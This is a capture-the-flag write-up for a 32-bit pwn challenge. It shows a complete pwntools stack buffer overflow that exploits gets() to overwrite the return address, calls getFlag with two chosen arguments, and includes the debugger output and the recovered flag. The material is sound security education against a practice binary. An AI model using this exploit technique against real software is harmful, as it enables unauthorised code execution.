## Name: Additional Information Needed
#### Author: @Soups71
#### Category: pwn
#### Difficulty: medium
#### Description: Another binary exploit challenge, but this time it's gonna take some more information for me to give you what you want.


## Procedure
We have a ```.elf``` file, we check the bin behavior, we can see
```
└─$ ./challenge.elf
Welcome to this simple pwn challenge...
All you have to do is make a call to the `getFlag()` function. That's it!
sp34rh34d

```
This says we have to call the function ```getFlag()```, using ```gdb``` we can recover the following addresses running the command ```info functions```
```
0x08049000  _init
0x08049040  setbuf@plt
0x08049050  __libc_start_main@plt
0x08049060  gets@plt
0x08049070  fgets@plt
0x08049080  fclose@plt
0x08049090  puts@plt
0x080490a0  fopen@plt
0x080490b0  _start
0x080490f0  _dl_relocate_static_pie
0x08049100  __x86.get_pc_thunk.bx
0x08049110  deregister_tm_clones
0x08049150  register_tm_clones
0x08049190  __do_global_dtors_aux
0x080491c0  frame_dummy
0x080491c6  buffer_init
0x08049214  getFlag
0x08049299  main
0x080492e4  _fini

```

The address for getflag function is ```0x08049214```. the main function has the following code 
```
{
  char local_28 [32];
  
  buffer_init();
  puts("Welcome to this simple pwn challenge...");
  puts("All you have to do is make a call to the `getFlag()` function. That\'s it!");
  gets(local_28);
  return 0;
}
```
the local_28 variable has the value ```32```, and ```gets()``` function use that value, so we can use this as reference for our exploit, checking the binary, this is ```32bits```
```
└─$ file challenge.elf 
challenge.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9833fc45a97733715b43eee3beed3f38264ccf79, for GNU/Linux 3.2.0, not stripped
```

I have tried to call the function ```getFlag()```, using the following code, and put a breakpoint for the address ```0x08049214```
```
from pwn import *
elf = ELF('./challenge.elf')
context(arch=elf.arch,os='linux',log_level='debug')
io = process(elf.path)
gdb.attach(io,gdbscript='''
	b *0x08049214
	n
	''')
offset = 32
getflag = p32(0x08049214)
payload = b'A' * offset + getflag 
io.sendlineafter(b' That\'s it',payload)
io.interactive()
```

From here we can see our ```getflag()``` address into the ```EBX``` and the ```EBP``` with ```0x0``` value. We have to put the address ```0x08049214``` into ```EIP``` to be able to call our function.

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
 EAX  0x0
*EBX  0x8049214 (getFlag) ◂— push ebp
 ECX  0xf7e378ac (_IO_stdfile_0_lock) ◂— 0x0
 EDX  0x0
 EDI  0xf7fa8b60 (_rtld_global_ro) ◂— 0x0
 ESI  0xffe71e5c —▸ 0xffe732bd ◂— 'COLORFGBG=0;15'
 EBP  0xffe71d98 ◂— 0x0
 ESP  0xffe71d74 ◂— 0x41414141 ('AAAA')
*EIP  0x80492e2 (main+73) ◂— leave 
─────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────
   0x80492d7  <main+62>                       add    esp, 4
   0x80492da  <main+65>                       mov    eax, 0
   0x80492df  <main+70>                       mov    ebx, dword ptr [ebp - 4]
 ► 0x80492e2  <main+73>                       leave  
   0x80492e3  <main+74>                       ret    
    ↓
   0xf7c24d43 <__libc_start_call_main+115>    add    esp, 0x10
   0xf7c24d46 <__libc_start_call_main+118>    sub    esp, 0xc
   0xf7c24d49 <__libc_start_call_main+121>    push   eax
   0xf7c24d4a <__libc_start_call_main+122>    call   exit                    <exit>
 
   0xf7c24d4f <__libc_start_call_main+127>    call   __nptl_deallocate_tsd                    <__nptl_deallocate_tsd>
 
   0xf7c24d54 <__libc_start_call_main+132>    mov    eax, dword ptr [esp]
──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ esp 0xffe71d74 ◂— 0x41414141 ('AAAA')
... ↓        7 skipped
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► 0 0x80492e2 main+73
   1 0xf7c24d43 __libc_start_call_main+115
   2 0xf7c24e08 __libc_start_main+136
   3 0x80490dc _start+44
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Change the payload to ```payload = b'A' * offset + b'B' * 4 + b'C' * 4 +getflag```, we can se the ```B``` value for ```EBX``` and ```C``` value for ```EBP```, now we were able to override the ```ret``` with our ```getflag``` function.

```
EAX  0x0
 EBX  0x42424242 ('BBBB')
 ECX  0xf7e378ac (_IO_stdfile_0_lock) ◂— 0x0
 EDX  0x0
 EDI  0xf7fe4b60 (_rtld_global_ro) ◂— 0x0
 ESI  0xffc1ddbc —▸ 0xffc1f2bd ◂— 'COLORFGBG=0;15'
*EBP  0x43434343 ('CCCC')
*ESP  0xffc1dcfc —▸ 0x8049214 (getFlag) ◂— push ebp
*EIP  0x80492e3 (main+74) ◂— ret 
─────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────
   0x80492d7 <main+62>       add    esp, 4
   0x80492da <main+65>       mov    eax, 0
   0x80492df <main+70>       mov    ebx, dword ptr [ebp - 4]
   0x80492e2 <main+73>       leave  
 ► 0x80492e3 <main+74>       ret                                  <0x8049214; getFlag>

```

The bin return the msg ```Nope!```

```
[DEBUG] Sent 0x2d bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  42 42 42 42  43 43 43 43  14 92 04 08  0a           │BBBB│CCCC│····│·│
    0000002d
[*] Switching to interactive mode
!
[DEBUG] Received 0x6 bytes:
    b'Nope!\n'

```

The function ```getFlag()``` has the following code

```
undefined4 getFlag(int param_1,int param_2)

{
  undefined4 uVar1;
  char local_3c [48];
  FILE *local_c;
  
  if (param_1 * param_2 == 0x23) {
    local_c = fopen("flag.txt","r");
    if (local_c != (FILE *)0x0) {
      fgets(local_3c,0x30,local_c);
      puts(local_3c);
      fclose(local_c);
    }
    uVar1 = 0;
  }
  else {
    puts("Nope!");
    uVar1 = 0xffffffff;
  }
  return uVar1;
}

```

It wait for two parameters and does a mul action with that values, the result has to be ```0x23```, that means ```35```. We have to send values like ```1 and 35 = 35``` or maybe ```7 and 5 = 35```.
```
from pwn import *
elf = ELF('./challenge.elf')
context(arch=elf.arch,os='linux',log_level='debug')
io = process(elf.path)

# gdb.attach(io,gdbscript='''
# 	b *0x08049214
# 	n
# 	''')

offset = 32
getflag = p32(0x08049214)

payload = b'A' * offset + b'B' * 4 + b'C' * 4 +getflag + b"D" * 4 + p32(7)+ p32(5) 
io.sendlineafter(b' That\'s it',payload)
print("Flag:",io.recvall().decode())
io.interactive()
```
Output with our fake flag
```
[DEBUG] Received 0x72 bytes:
    b'Welcome to this simple pwn challenge...\n'
    b"All you have to do is make a call to the `getFlag()` function. That's it!\n"
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  42 42 42 42  43 43 43 43  14 92 04 08  44 44 44 44  │BBBB│CCCC│····│DDDD│
    00000030  07 00 00 00  05 00 00 00  0a                        │····│····│·│
    00000039
[+] Receiving all data: Done (19B)
[DEBUG] Received 0x11 bytes:
    b'flag{sp34rh34d}\n'
    b'\n'
[*] Stopped process '/home/sp34rh34d/challenge.elf' (pid 2118427)
Flag: !
flag{sp34rh34d}

```
just change the line ```io = process(elf.path)``` to ```io = remote('challenge.ctf.games',31150)``` to recover the flag.

<img width="1275" alt="Screenshot 2025-03-05 at 10 29 15 AM" src="https://github.com/user-attachments/assets/75caf14f-8155-4628-8d03-aa35c0136af8" />


Flag ```flag{8e9e2e4ec228db4207791e0a534716c3}```

